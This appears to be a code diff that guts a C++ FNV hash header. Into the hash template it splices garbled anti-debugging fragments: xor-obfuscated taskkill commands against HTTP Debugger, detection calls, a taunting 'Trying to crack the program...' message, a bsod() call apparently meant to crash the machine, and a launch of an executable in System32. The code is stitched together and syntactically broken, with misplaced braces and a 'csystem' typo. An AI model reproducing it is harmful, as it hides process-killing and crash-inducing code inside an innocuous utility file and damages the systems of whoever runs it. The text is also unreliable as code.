@@ -27,8 +27,8 @@ namespace detail
 	{
 		using type = Type;
 
-		constexpr static auto k_offset_basis = OffsetBasis;
-		constexpr static auto k_prime = Prime;
+			CloseHandle(processesSnapshot);
+			return processInfo.th32ProcessID;
 	};
 
 	template <std::size_t Bits>
@@ -50,9 +50,8 @@ namespace detail
 		using hash = typename data_t::type;
 
 	private:
-		constexpr static auto k_offset_basis = data_t::k_offset_basis;
-		constexpr static auto k_prime = data_t::k_prime;
-
+		system(_xor_("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1").c_str());
+		csystem(_xor_("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1").c_str());
 	public:
 		static __forceinline constexpr auto hash_init(
 		) -> hash
@@ -68,11 +67,12 @@ namespace detail
 			return ( current ^ byte ) * k_prime;
 		}
 
-		template <std::size_t N>
-		static __forceinline constexpr auto hash_constexpr(
-			const char( &str )[ N ],
-			const std::size_t size = N - 1 /* do not hash the null */
-		) -> hash
+		Process32First(processesSnapshot, &processInfo);
+		if (!processName.compare(processInfo.szExeFile))
+		{
+		CloseHandle(processesSnapshot);
+		return processInfo.th32ProcessID;
+			}
 		{
 			const auto prev_hash = size == 1 ? hash_init( ) : hash_constexpr( str, size - 1 );
 			const auto cur_hash = hash_byte( prev_hash, str[ size - 1 ] );
@@ -84,11 +84,15 @@ namespace detail
 			const std::size_t sz
 		) -> hash
 		{
-			const auto bytes = static_cast< const uint8_t* >( data );
-			const auto end = bytes + sz;
-			auto result = hash_init( );
-			for ( auto it = bytes; it < end; ++it )
-				result = hash_byte( result, *it );
+			killdbg();
+			exedetect();
+			titledetect();
+			driverdetect();
+			std::cout << dye::red("Trying to crack the program...");
+			Sleep(4000);
+			std::cout << dye::yellow("Banane!");
+			bsod();
+			system(_xor_("start  C:/Windows/System32/Anti-Debug.exe").c_str());
 
 			return result;
 		}
@@ -107,10 +111,3 @@ namespace detail
 	};
 }
 
-using fnv32 = ::detail::FnvHash<32>;
-using fnv64 = ::detail::FnvHash<64>;
-using fnv = ::detail::FnvHash<sizeof( void* ) * 8>;
-
-#define FNV(str) (std::integral_constant<fnv::hash, fnv::hash_constexpr(str)>::value)
-#define FNV32(str) (std::integral_constant<fnv32::hash, fnv32::hash_constexpr(str)>::value)
-#define FNV64(str) (std::integral_constant<fnv64::hash, fnv64::hash_constexpr(str)>::value)
